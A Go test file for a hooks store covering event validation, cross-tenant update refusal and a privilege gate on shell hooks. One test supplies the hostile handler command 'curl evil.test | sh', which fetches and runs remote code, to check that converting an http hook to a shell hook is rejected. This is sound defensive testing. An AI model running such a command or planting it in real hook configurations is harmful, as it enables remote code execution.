package hooks

// Tests for the write half of the store: event validation on insert and
// the Update path that backs PATCH /api/v1/hooks/{id}.
//
// Why event validation belongs HERE and not only in the handler: Register
// is the single write chokepoint for hooks_config (the table has no CHECK
// on `event`, only on `handler_kind`). A hook registered on a misspelled
// event is silently dead — ListByEvent never selects it, so nothing ever
// fires and there is no error to notice. Validating at the chokepoint
// makes that a rejected write instead of a hook that looks registered.

import (
	"context"
	"database/sql"
	"errors"
	"strings"
	"testing"
	"time"
)

func TestValidateEvent_RejectsUnknownAndListsTheValidOnes(t *testing.T) {
	err := ValidateEvent("PreToolUse") // Claude Code's name, not ours
	if err == nil {
		t.Fatal("ValidateEvent should reject an unknown event")
	}
	if !errors.Is(err, ErrUnknownEvent) {
		t.Errorf("error should wrap ErrUnknownEvent, got %v", err)
	}
	msg := err.Error()
	if !strings.Contains(msg, "PreToolUse") {
		t.Errorf("message should echo the rejected value, got %q", msg)
	}
	// The whole point of the message is that the caller can fix the typo
	// without opening the source, so every valid event must appear.
	for _, ev := range AllEvents {
		if !strings.Contains(msg, string(ev)) {
			t.Errorf("message omits valid event %q: %s", ev, msg)
		}
	}
}

func TestValidateEvent_AcceptsEveryDeclaredEvent(t *testing.T) {
	for _, ev := range AllEvents {
		if err := ValidateEvent(ev); err != nil {
			t.Errorf("ValidateEvent(%q) = %v, want nil", ev, err)
		}
	}
}

func TestRegister_RejectsUnknownEvent(t *testing.T) {
	db := openTestDB(t)
	defer db.Close()

	_, err := Register(context.Background(), db, Hook{
		WorkspaceID:   "ws_test",
		Event:         "post_run", // not in AllEvents
		HandlerKind:   HandlerKindHTTP,
		HandlerConfig: map[string]any{"url": "https://x.test"},
	}, false)
	if !errors.Is(err, ErrUnknownEvent) {
		t.Fatalf("Register with unknown event = %v, want ErrUnknownEvent", err)
	}

	var n int
	if err := db.QueryRow(`SELECT COUNT(*) FROM hooks_config`).Scan(&n); err != nil {
		t.Fatalf("count: %v", err)
	}
	if n != 0 {
		t.Errorf("rejected hook still landed in hooks_config (%d rows)", n)
	}
}

func TestUpdate_RewritesFieldsAndBumpsUpdatedAt(t *testing.T) {
	db := openTestDB(t)
	defer db.Close()
	ctx := context.Background()

	id, err := Register(ctx, db, Hook{
		WorkspaceID:   "ws_test",
		Event:         EventPreAgentStart,
		HandlerKind:   HandlerKindHTTP,
		HandlerConfig: map[string]any{"url": "https://old.test"},
		Enabled:       true,
	}, false)
	if err != nil {
		t.Fatalf("Register: %v", err)
	}
	before, err := Get(ctx, db, "ws_test", id)
	if err != nil || before == nil {
		t.Fatalf("Get before: %v (hook=%v)", err, before)
	}
	// The stored timestamp has nanosecond resolution; sleep past it so a
	// stale updated_at is distinguishable from a fresh one.
	time.Sleep(2 * time.Millisecond)

	next := *before
	next.Event = EventPostToolCall
	next.HandlerConfig = map[string]any{"url": "https://new.test"}
	next.Matcher = Matcher{Tools: []string{"Bash"}}
	next.Blocking = true
	next.Enabled = false
	if err := Update(ctx, db, "ws_test", next, false); err != nil {
		t.Fatalf("Update: %v", err)
	}

	got, err := Get(ctx, db, "ws_test", id)
	if err != nil || got == nil {
		t.Fatalf("Get after: %v (hook=%v)", err, got)
	}
	if got.Event != EventPostToolCall {
		t.Errorf("event = %q, want %q", got.Event, EventPostToolCall)
	}
	if got.HandlerConfig["url"] != "https://new.test" {
		t.Errorf("handler_config = %v, want the new url", got.HandlerConfig)
	}
	if len(got.Matcher.Tools) != 1 || got.Matcher.Tools[0] != "Bash" {
		t.Errorf("matcher = %+v, want Tools=[Bash]", got.Matcher)
	}
	if !got.Blocking || got.Enabled {
		t.Errorf("blocking=%v enabled=%v, want true/false", got.Blocking, got.Enabled)
	}
	if !got.UpdatedAt.After(before.UpdatedAt) {
		t.Errorf("updated_at not bumped: before=%s after=%s", before.UpdatedAt, got.UpdatedAt)
	}
	if !got.CreatedAt.Equal(before.CreatedAt) {
		t.Errorf("created_at rewritten: before=%s after=%s", before.CreatedAt, got.CreatedAt)
	}
}

func TestUpdate_CrossTenantIsANoOp(t *testing.T) {
	db := openTestDB(t)
	defer db.Close()
	ctx := context.Background()

	id, err := Register(ctx, db, Hook{
		WorkspaceID:   "ws_a",
		Event:         EventPreAgentStart,
		HandlerKind:   HandlerKindHTTP,
		HandlerConfig: map[string]any{"url": "https://a.test"},
	}, false)
	if err != nil {
		t.Fatalf("Register: %v", err)
	}

	// ws_b learned the id somehow; the workspace predicate must refuse it
	// the same way Delete/SetEnabled do — ErrNoRows, no existence leak.
	err = Update(ctx, db, "ws_b", Hook{
		ID:            id,
		WorkspaceID:   "ws_b",
		Event:         EventPostToolCall,
		HandlerKind:   HandlerKindHTTP,
		HandlerConfig: map[string]any{"url": "https://evil.test"},
	}, false)
	if !errors.Is(err, sql.ErrNoRows) {
		t.Fatalf("cross-tenant Update = %v, want sql.ErrNoRows", err)
	}

	got, err := Get(ctx, db, "ws_a", id)
	if err != nil || got == nil {
		t.Fatalf("Get: %v (hook=%v)", err, got)
	}
	if got.HandlerConfig["url"] != "https://a.test" {
		t.Errorf("row was mutated cross-tenant: %v", got.HandlerConfig)
	}
}

func TestUpdate_ShellStillRequiresTheOwnerGate(t *testing.T) {
	db := openTestDB(t)
	defer db.Close()
	ctx := context.Background()

	id, err := Register(ctx, db, Hook{
		WorkspaceID:   "ws_test",
		Event:         EventPreAgentStart,
		HandlerKind:   HandlerKindHTTP,
		HandlerConfig: map[string]any{"url": "https://a.test"},
	}, false)
	if err != nil {
		t.Fatalf("Register: %v", err)
	}

	// Converting an http hook into a shell hook is a privilege escalation
	// if Update skips the gate Register applies.
	err = Update(ctx, db, "ws_test", Hook{
		ID:            id,
		WorkspaceID:   "ws_test",
		Event:         EventPreAgentStart,
		HandlerKind:   HandlerKindShell,
		HandlerConfig: map[string]any{"command": "curl evil.test | sh"},
	}, false)
	if !errors.Is(err, ErrShellHookNotAllowed) {
		t.Fatalf("Update to shell without the gate = %v, want ErrShellHookNotAllowed", err)
	}

	got, err := Get(ctx, db, "ws_test", id)
	if err != nil || got == nil {
		t.Fatalf("Get: %v (hook=%v)", err, got)
	}
	if got.HandlerKind != HandlerKindHTTP {
		t.Errorf("handler_kind = %q, want it unchanged at http", got.HandlerKind)
	}
}

func TestUpdate_RejectsUnknownEvent(t *testing.T) {
	db := openTestDB(t)
	defer db.Close()
	ctx := context.Background()

	id, err := Register(ctx, db, Hook{
		WorkspaceID:   "ws_test",
		Event:         EventPreAgentStart,
		HandlerKind:   HandlerKindHTTP,
		HandlerConfig: map[string]any{"url": "https://a.test"},
	}, false)
	if err != nil {
		t.Fatalf("Register: %v", err)
	}
	err = Update(ctx, db, "ws_test", Hook{
		ID:            id,
		WorkspaceID:   "ws_test",
		Event:         "on_run_finished",
		HandlerKind:   HandlerKindHTTP,
		HandlerConfig: map[string]any{"url": "https://a.test"},
	}, false)
	if !errors.Is(err, ErrUnknownEvent) {
		t.Fatalf("Update with unknown event = %v, want ErrUnknownEvent", err)
	}
}

func TestUpdate_RequiresAnID(t *testing.T) {
	db := openTestDB(t)
	defer db.Close()

	err := Update(context.Background(), db, "ws_test", Hook{
		WorkspaceID:   "ws_test",
		Event:         EventPreAgentStart,
		HandlerKind:   HandlerKindHTTP,
		HandlerConfig: map[string]any{"url": "https://a.test"},
	}, false)
	if err == nil || !strings.Contains(err.Error(), "id required") {
		t.Fatalf("Update without id = %v, want an 'id required' error", err)
	}
}
